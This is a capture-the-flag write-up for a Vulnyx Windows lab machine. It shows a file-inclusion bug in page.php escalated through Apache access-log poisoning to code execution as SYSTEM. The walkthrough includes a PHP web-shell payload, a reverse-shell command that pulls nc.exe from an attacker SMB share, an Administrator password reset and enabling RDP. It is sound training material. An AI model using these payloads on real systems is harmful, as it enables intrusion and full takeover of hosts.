# Vulnyx: Tech

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Windows |
| **Difficulty** | Medium |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `curl` · `impacket-smbserver` · `nc` · `nxc` · `xfreerdp` |
| **Tags** | `#LFI` `#LogPoisoning` `#RCE` `#PasswordReset` `#RDP` |
| **URL** | https://vulnyx.com/machines/ |

A `page.php?i=` parameter reads arbitrary Windows file paths directly, including Apache's own config — used to find a non-default log path. Poisoning that log with a PHP payload in the User-Agent header, then including it through the same LFI, gives RCE. Because XAMPP's Apache runs as SYSTEM here, that shell already carries enough privilege to reset the Administrator's password directly and enable RDP via `nxc`, without needing a separate token-impersonation exploit.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn tech.nyx

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49669/tcp open  unknown      syn-ack ttl 128
49670/tcp open  unknown      syn-ack ttl 128
MAC Address: 08:00:27:86:08:3E (Oracle VirtualBox virtual NIC)
```

A version/script scan against the open ports fills in the details — a typical Windows spread, though the web server on 80 turns out to be XAMPP/Apache (with PHP) rather than IIS:

```bash
$ sudo nmap -p 80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sCV tech.nyx

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-methods: Potentially risky methods: TRACE
|_http-title: Techro - Flat Free Responsive bootstrap template
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664-49670/tcp open  msrpc  Microsoft Windows RPC

Host script results:
|_clock-skew: 8h50m57s
|_smb2-security-mode: 3.1.1: smb2_message_signing enabled but not required
|_nbstat: NetBIOS name: TECH, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:86:08:3e
|_smb2-time: date: 2026-06-30T22:12:21
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Web Enumeration

```
http://tech.nyx
```

<img src="../Images/tech/Pasted image 20260630151645.png"/>

The page source points at a dynamic include endpoint — a `page.php` that takes an `i` parameter, the classic shape of a file-inclusion bug:

```
view-source:http://tech.nyx/
```

<img src="../Images/tech/Pasted image 20260630151944.png"/>

> **Endpoint:** `page.php?i=`

## Initial Access

### LFI Discovery

The `i` parameter is passed straight into a PHP `include()`, so a full Windows path is read directly — no `../` traversal needed:

```bash
$ curl -s -X GET 'http://tech.nyx/page.php?i=c:\windows\system32\drivers\etc\hosts'
# Copyright (c) 1993-2009 Microsoft Corp.
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
# This file contains the mappings of IP addresses to host names...
#    127.0.0.1       localhost
#    ::1             localhost
```

### Finding the Real Log Path

Log poisoning needs the exact path of a log file the LFI can include. Rather than guessing a default Apache location, the config itself is read first and grepped for its log directives:

```bash
$ curl -s -X GET 'http://tech.nyx/page.php?i=c:\xampp\apache\conf\httpd.conf' | grep -E 'CustomLog|ErrorLog'
#ErrorLog: The location of the error log file.
#ErrorLog "logs/techro-events/error.log"
#CustomLog "logs/access.log" common
CustomLog "logs/techro-events/access.log" combined
```

The active `CustomLog` points at a custom, vhost-specific path (`logs/techro-events/access.log`) rather than the default — a location that guessing would have missed. Reading it back through the LFI confirms it's the live access log:

```bash
$ curl -s -X GET 'http://tech.nyx/page.php?i=c:\xampp\apache\logs\techro-events\access.log'

<ATTACKER_IP> - - [30/Jun/2026:15:21:14 -0700] "GET /page.php?i=c:\windows\system32\\drivers\etc\hosts HTTP/1.1" 200 824
<ATTACKER_IP> - - [30/Jun/2026:15:21:23 -0700] "GET /page.php?i=c:\xampp\apache\conf\httpd.conf HTTP/1.1" 200 21804
<ATTACKER_IP> - - [30/Jun/2026:15:22:07 -0700] "GET /page.php?i=c:\xampp\apache\logs\techro-events\access.log HTTP/1.1" 200 4427
```

### RCE via Log Poisoning

The access log records the `User-Agent` of each request verbatim. Sending a request whose `User-Agent` is a PHP payload writes that PHP into the log file:

```bash
$ curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://tech.nyx"
```

Then including that log file through the LFI makes PHP parse and execute the payload it now contains — with a `cmd` parameter supplying the command to run. It comes back as `nt authority\system`, because XAMPP's Apache is running as SYSTEM:

```bash
$ curl -s -X GET 'http://tech.nyx/page.php?i=c:\xampp\apache\logs\techro-events\access.log&cmd=whoami'

<ATTACKER_IP> - - [30/Jun/2026:15:55:18 -0700] "GET / HTTP/1.1" 200 15979 "-" "nt authority\system
```

### Shell as SYSTEM

`nc.exe` is copied into the working directory and served over an SMB share so the target can pull it down:

```bash
$ locate nc.exe
$ cp /usr/share/windows-resources/binaries/nc.exe ~/Vulnyx/Medium/Tech
$ impacket-smbserver smb . -smb2support
```

The same log-poisoning technique triggers a reverse shell instead of a one-off command, pulling `nc.exe` over the SMB share via its UNC path:

```bash
$ curl -s -X GET "http://tech.nyx/page.php?i=c:\xampp\apache\logs\techro-events\access.log&cmd=\\\\<ATTACKER_IP>\\smb\\nc.exe+<ATTACKER_IP>+<PORT>+-e+cmd.exe"
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [tech.nyx] 49672
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
nt authority\system
```

## Post-Exploitation

Already SYSTEM, there's no privilege escalation to do — the remaining work is turning the raw web shell into clean, stable access. A look at the Administrator's Desktop shows it empty, and PowerShell history explains why:

```cmd
C:\> dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is E806-A716

 Directory of C:\Users\Administrator\Desktop

05/24/2026  12:56 PM    <DIR>          .
05/24/2026  12:56 PM    <DIR>          ..
                0 File(s)        0 bytes
           2 Dir(s)  42,604,843,008 bytes free
```

```cmd
C:\> dir C:\Users\ConsoleHost_history.txt /s /a
 Directory of C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

05/24/2026  12:57 PM           142 ConsoleHost_history.txt

C:\> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig
Remove-Item "C:\Users\Administrator\Desktop\user.txt" -Force
Remove-Item "C:\Users\Administrator\Desktop\root.txt" -Force
```

### Setting a Known Administrator Password

Running as SYSTEM, the Administrator password can be reset outright — trading the awkward web shell for credentials that work with standard remote-access tooling:

```cmd
C:\> net user administrator Password123
The command completed successfully.
```

### Enabling RDP

`nxc` confirms the new password, then uses its `rdp` module to toggle Remote Desktop on directly through SMB/WMI — no manual registry edit or service fiddling required:

```bash
$ nxc smb tech.nyx
SMB         tech.nyx   445    TECH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:TECH) (domain:TECH) (signing:False) (SMBv1:None)

$ nxc smb tech.nyx -u 'administrator' -p 'Password123'
SMB         tech.nyx   445    TECH         [+] TECH\administrator:Password123 (Pwned!)

$ nxc smb tech.nyx -u 'administrator' -p 'Password123' -M rdp -o action=enable
SMB         tech.nyx   445    TECH         [+] Enable RDP via WMI (ncacn_ip:tcp) successfully
RDP         tech.nyx   445    TECH         [+] RDP Port: 3389
```

The port takes a moment to come up — the first scan still shows it closed, the second confirms it listening:

```bash
$ sudo nmap -p 3389 -sCV tech.nyx

PORT     STATE  SERVICE
3389/tcp closed ms-wbt-server
```

```bash
$ sudo nmap -p 3389 -sCV tech.nyx

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: TECH
|   Product_Version: 10.0.17763
|   System_Time: 2026-06-30T23:21:55+00:00
| ssl-cert: Subject: commonName=TECH
| Not valid before: 2026-06-29T23:21:35
|_Not valid after:  2026-12-29T23:21:35
|_clock-skew: mean: 8h59m58s
```

### Shell as Administrator via RDP

```bash
$ xfreerdp /v:tech.nyx /u:administrator /p:Password123 /cert:ignore +clipboard /dynamic-resolution
```

<img src="../Images/tech/Pasted image 20260630133800.png"/>
<img src="../Images/tech/Pasted image 20260630133822.png"/>
<img src="../Images/tech/Pasted image 20260630162954.png"/>

> **User flag:** `db78607af7be317a6d55b159794078e7`
> **Root flag:** `c084397e6ca8069fe1bfe3590d28cf67`

## Takeaways

- Reading a web server's own config file through an LFI, before guessing log paths, is worth doing routinely — a custom or vhost-specific log location (like the one here) would otherwise go unnoticed.
- Log poisoning works with any header or field the server logs verbatim — `User-Agent` is common, but `Referer`, custom headers, and request paths are worth trying too if one doesn't pan out.
- On Windows, the privilege a web shell inherits depends entirely on how the web server runs — XAMPP defaulting to SYSTEM meant no escalation was needed at all, where an IIS app-pool identity would have required a Potato-style step.
- `nxc`'s built-in modules (like `-M rdp -o action=enable`) save a lot of manual registry/service work once valid admin credentials are in hand — worth knowing what modules are available beyond basic auth checks.